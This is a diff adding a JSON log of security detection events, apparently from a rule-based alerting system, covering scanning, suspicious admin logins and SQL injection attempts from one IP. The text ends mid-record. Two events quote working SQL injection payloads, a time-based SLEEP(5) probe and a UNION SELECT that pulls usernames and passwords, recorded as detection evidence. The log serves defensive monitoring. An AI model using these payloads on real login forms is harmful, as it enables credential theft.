@@ -1,0 +1,4437 @@
+[
+  {
+    "event_id": "41e1a2f7-7031-4a07-8dd2-20e2a560d993",
+    "event_time": "2026-10-27T14:02:31Z",
+    "detect_time": "2026-11-17T09:29:31.095834Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "api_call",
+    "object_type": "uri",
+    "object_id": "/config.php.bak",
+    "attack_type": "Scanning_Probe",
+    "risk_score": 20.0,
+    "risk_level": "low",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同源IP短时间大量敏感路径探测"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "scanning_probe"
+    ],
+    "evidence": {
+      "src_ip": "198.51.100.23",
+      "error_count_in_window": 5,
+      "window_minutes": 5,
+      "sample_uri": "/config.php.bak /config.php.bak"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0107"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.095834Z",
+    "related_logs_summary": "user=unknown src_ip=198.51.100.23 action=api_call result=error resource=/config.php.bak"
+  },
+  {
+    "event_id": "anom-daa90efdb54e46203c429c4895257478",
+    "event_time": "2026-10-27T14:05:09Z",
+    "detect_time": "2026-11-17T09:29:31.088371Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_ip"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "new_ip": "198.51.100.23"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0112"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088371Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-a7e0176e03404bd3f4db91d15cdb3628",
+    "event_time": "2026-10-27T14:05:09Z",
+    "detect_time": "2026-11-17T09:29:31.088610Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 35.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 15,
+      "behavior_sensitivity": 0,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_ip"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "new_ip": "198.51.100.23"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088610Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-efc66813bfd75d29bb8410eaf1e1ddf2",
+    "event_time": "2026-10-27T14:05:09Z",
+    "detect_time": "2026-11-17T09:29:31.088474Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0112"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088474Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-468643ee06dd7608beaee6f65b5a2370",
+    "event_time": "2026-10-27T14:05:09Z",
+    "detect_time": "2026-11-17T09:29:31.088667Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0113",
+      "LOG-20261027-0112"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088667Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-b838d56a15d503d6ce31d1c0cb3614e4",
+    "event_time": "2026-10-27T14:05:31Z",
+    "detect_time": "2026-11-17T09:29:31.088769Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0114",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088769Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-6172e716f0049d74bb6ef5464114f5c7",
+    "event_time": "2026-10-27T14:05:31Z",
+    "detect_time": "2026-11-17T09:29:31.088869Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0115",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088869Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-899c36e618837a45edadac481f06de54",
+    "event_time": "2026-10-27T14:06:04Z",
+    "detect_time": "2026-11-17T09:29:31.089005Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0116",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089005Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-1ea6342f390b38ee5c71712cfe2dc630",
+    "event_time": "2026-10-27T14:06:04Z",
+    "detect_time": "2026-11-17T09:29:31.089134Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0117",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089134Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-4c642221e34e4851c4511d89aec8e4ec",
+    "event_time": "2026-10-27T14:06:04Z",
+    "detect_time": "2026-11-17T09:29:31.088960Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "sensitive_count_5m": 5,
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0116"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.088960Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-b87c61ff39ac87b5b69dd7ad8191c5b3",
+    "event_time": "2026-10-27T14:06:04Z",
+    "detect_time": "2026-11-17T09:29:31.089096Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "sensitive_count_5m": 6,
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0117"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089096Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-373ede59e6fe9d27545e6df68c1f3ab5",
+    "event_time": "2026-10-27T14:06:37Z",
+    "detect_time": "2026-11-17T09:29:31.089253Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0118",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089253Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-11d755a0f849d151bf1c31aad2e98d45",
+    "event_time": "2026-10-27T14:06:37Z",
+    "detect_time": "2026-11-17T09:29:31.089376Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0119",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089376Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-7d12ba87e501a8b0025701c9e4066093",
+    "event_time": "2026-10-27T14:06:37Z",
+    "detect_time": "2026-11-17T09:29:31.089217Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "sensitive_count_5m": 7,
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0118"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089217Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-a5ae4b6fc2634894a4c3fc2bce63cfaf",
+    "event_time": "2026-10-27T14:06:37Z",
+    "detect_time": "2026-11-17T09:29:31.089341Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "sensitive_count_5m": 8,
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0119"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089341Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-52badc4381d82de0f5125b4973e354ab",
+    "event_time": "2026-10-27T14:07:12Z",
+    "detect_time": "2026-11-17T09:29:31.089493Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0120",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089493Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-d02e0ca633e8508e35d63c14763b3e0b",
+    "event_time": "2026-10-27T14:07:12Z",
+    "detect_time": "2026-11-17T09:29:31.089608Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "account_takeover",
+    "risk_score": 80.0,
+    "risk_level": "critical",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 25,
+      "behavior_sensitivity": 20,
+      "event_correlation": 10,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "新IP登录后短时间访问敏感资源"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "new_source_then_sensitive_access",
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "src_ip": "198.51.100.23",
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0121",
+      "LOG-20261027-0112",
+      "LOG-20261027-0113"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "pending",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089608Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-95ecdb977dcf3aaad4bf63a7dad2c241",
+    "event_time": "2026-10-27T14:07:12Z",
+    "detect_time": "2026-11-17T09:29:31.089458Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "sensitive_count_5m": 9,
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0120"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089458Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-6489d6683e4978fb3e570dfa84b6d5a6",
+    "event_time": "2026-10-27T14:07:12Z",
+    "detect_time": "2026-11-17T09:29:31.089574Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "vpn",
+    "action": "login",
+    "object_type": "session",
+    "object_id": "/admin/login.php",
+    "attack_type": "sensitive_access",
+    "risk_score": 40.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 20,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "同一user_id在5分钟内敏感资源访问超阈值"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sensitive_resource_access"
+    ],
+    "evidence": {
+      "user_id": "admin",
+      "sensitive_count_5m": 10,
+      "resource": "/admin/login.php"
+    },
+    "related_event_ids": [
+      "LOG-20261027-0121"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.089574Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "74e6950f-8aed-4580-8008-00e5b3eb06c3",
+    "event_time": "2026-10-27T14:14:05Z",
+    "detect_time": "2026-11-17T09:29:31.096101Z",
+    "tenant_id": "default",
+    "user_id": null,
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php?username=admin&password=1'%20AND%20SLEEP(5)--%20",
+    "attack_type": "SQL_Injection",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI/载荷包含SQL注入特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sql_injection"
+    ],
+    "evidence": {
+      "src_ip": "198.51.100.23",
+      "uri": "/admin/login.php?username=admin&password=1'%20AND%20SLEEP(5)--%20 /admin/login.php?username=admin&password=1'%20AND%20SLEEP(5)--%20",
+      "payload": "",
+      "matched": "SLEEP(",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261027-0125"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096101Z",
+    "related_logs_summary": "user=unknown src_ip=198.51.100.23 action=login result=success resource=/admin/login.php?username=admin&password=1'%20AND%20SLEEP(5)--%20"
+  },
+  {
+    "event_id": "3a646916-ed17-4205-890e-16c497546e34",
+    "event_time": "2026-10-27T14:14:52Z",
+    "detect_time": "2026-11-17T09:29:31.096168Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
+    "attack_type": "SQL_Injection",
+    "risk_score": 45.0,
+    "risk_level": "medium",
+    "risk_components": {
+      "rule_strength": 25,
+      "baseline_deviation": 0,
+      "behavior_sensitivity": 20,
+      "event_correlation": 0,
+      "feedback_adjustment": 0
+    },
+    "rule_hits": [
+      "URI/载荷包含SQL注入特征"
+    ],
+    "baseline_deviations": [],
+    "reason_codes": [
+      "sql_injection"
+    ],
+    "evidence": {
+      "src_ip": "198.51.100.23",
+      "uri": "/admin/login.php /admin/login.php",
+      "payload": "username=admin&password=*** UNION SELECT 1,username,password FROM users-- -",
+      "matched": "UNION SELECT",
+      "status_code": 200
+    },
+    "related_event_ids": [
+      "LOG-20261027-0126"
+    ],
+    "scenario_id": null,
+    "scenario_type": null,
+    "attack_chain_id": null,
+    "ai_status": "not_required",
+    "status": "new",
+    "model_version": "rule-v1",
+    "scoring_version": "risk-scoring-v1",
+    "created_at": "2026-11-17T09:29:31.096168Z",
+    "related_logs_summary": "user=admin src_ip=198.51.100.23 action=login result=success resource=/admin/login.php"
+  },
+  {
+    "event_id": "anom-019bfcc6ef01b79d1f45d2b0fe4e125b",
+    "event_time": "2026-10-27T14:14:52Z",
+    "detect_time": "2026-11-17T09:29:31.089790Z",
+    "tenant_id": "default",
+    "user_id": "admin",
+    "src_ip": "198.51.100.23",
+    "host": "web-prod-01",
+    "source_type": "oa",
+    "action": "login",
+    "object_type": "uri",
+    "object_id": "/admin/login.php",
